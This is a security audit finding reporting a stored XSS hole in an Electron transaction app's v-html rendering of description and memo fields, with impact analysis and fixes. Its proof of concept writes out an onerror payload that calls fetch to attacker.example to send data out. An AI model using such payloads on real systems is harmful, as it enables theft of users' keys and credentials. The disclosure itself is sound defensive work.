Audit Report

## Title
Unsanitized User-Controlled Data Rendered via `v-html` in Transaction Group View Enables Stored XSS

## Summary
In `CreateTransactionGroup.vue`, a `v-html` directive renders `groupItem.description` and `Transaction.fromBytes(groupItem.transactionBytes).transactionMemo` as raw HTML without sanitization. Both values are user-controlled and stored persistently. An attacker who sets a malicious description or transaction memo can inject arbitrary HTML/JavaScript that executes in the Electron renderer process of any user who opens the Create Transaction Group view.

## Finding Description

The `v-html` directive at lines 421–429 of `CreateTransactionGroup.vue` renders a ternary expression whose non-`makeTransfer` branches fall through to fully attacker-controlled strings:

```vue
v-html="
  groupItem.type == 'Transfer Transaction'
    ? makeTransfer(index)
    : groupItem.description != ''
      ? groupItem.description
      : Transaction.fromBytes(groupItem.transactionBytes).transactionMemo
        ? Transaction.fromBytes(groupItem.transactionBytes).transactionMemo
        : createTransactionId(groupItem.payerAccountId, groupItem.validStart)
"
``` [1](#0-0) 

The reason `v-html` is used at all is that the `makeTransfer` branch calls `formatHbarTransfers`, which in turn calls `stringifyHbarWithFont` — a function that intentionally returns an HTML string containing a `<span>` tag for styling:

```ts
return `${displayAmount} <span class="${fontClass}">${displayUnit}</span>`;
``` [2](#0-1) 

The `makeTransfer` path is therefore the legitimate reason for `v-html`. However, the `description` and `transactionMemo` branches are free-text strings with no HTML sanitization applied before being set as `innerHTML`. Neither field has any format restriction that would prevent HTML injection.

By contrast, the confirmation modal in `TransactionGroupProcessor.vue` renders the same fields safely using `{{ }}` interpolation:

```vue
{{ groupItem.description != ''
  ? groupItem.description
  : Transaction.fromBytes(groupItem.transactionBytes).transactionMemo ... }}
``` [3](#0-2) 

And `TransactionDetails.vue` also renders `transactionMemo` safely: [4](#0-3) 

The `CreateTransactionGroup.vue` `v-html` usage is the isolated exception in the codebase.

## Impact Explanation

This is a **Stored XSS** vulnerability in an Electron desktop application. The Electron main window is configured with:

- `nodeIntegration: false`
- `contextIsolation: true`
- `sandbox: false` [5](#0-4) 

Direct `require('child_process')` calls from XSS are blocked by `nodeIntegration: false`. However, the preload script exposes a broad `electronAPI` surface via `contextBridge`: [6](#0-5) 

This `electronAPI` includes IPC handlers for: `keyPairs`, `encryptedKeys`, `accounts`, `transactionDrafts`, `transactionGroups`, `transactionFile`, `safeStorage`, `organizationCredentials`, and more. [7](#0-6) 

An XSS payload can call `window.electronAPI.local.*` methods to:
- Exfiltrate stored key pairs, encrypted private keys, or organization credentials
- Read/write transaction drafts and groups
- Perform actions on behalf of the victim within the app

In **organization mode**, every member who opens the Create Transaction Group view is affected by a single malicious description stored server-side.

## Likelihood Explanation

- The attack surface is reachable by any authenticated organization member who can create a transaction — a normal, non-privileged role.
- The payload is stored server-side and triggers automatically when any other user opens the group view — no social engineering beyond normal app usage is required.
- In personal mode, importing a crafted `.htx` transaction file with a malicious memo is a documented feature of the application, making the `transactionMemo` path also exploitable.
- The `description` field (up to 256 characters) has no format validation preventing HTML injection. [8](#0-7) 

## Recommendation

The root cause is that `v-html` is used for the entire ternary expression when only the `makeTransfer` branch requires HTML rendering. The fix should isolate the HTML-rendering path:

1. Split the `v-html` element into two sibling elements: one using `v-html` only for the `makeTransfer` branch, and one using safe `{{ }}` interpolation for the `description`/`transactionMemo`/`transactionId` branches.
2. Alternatively, sanitize `groupItem.description` and `transactionMemo` through a library such as [DOMPurify](https://github.com/cure53/DOMPurify) before passing them to `v-html`.

Option 1 (structural split) is preferred as it eliminates the class of vulnerability entirely for those branches without relying on a sanitizer being correctly applied.

## Proof of Concept

**Organization mode attack:**

1. Attacker (authenticated org member) creates a transaction with description set to:
   ```html
   <img src=x onerror="fetch('https://attacker.example/exfil?keys='+JSON.stringify(Object.keys(window.electronAPI.local)))">
   ```
2. Attacker adds the transaction to a group and submits it to the organization backend.
3. Any other organization member who navigates to the Create Transaction Group view and the group is loaded will have the payload execute in their Electron renderer.
4. The payload can enumerate and call `window.electronAPI.local` IPC methods to exfiltrate key pairs, credentials, or perform privileged operations.

**Personal mode attack:**

1. Attacker crafts a Hedera transaction binary with `transactionMemo` set to `<script>...</script>` or an `onerror` payload.
2. Victim imports the crafted `.htx` file (a documented feature).
3. When the victim opens the Create Transaction Group view with this transaction added, the memo is rendered via `v-html` and the payload executes.
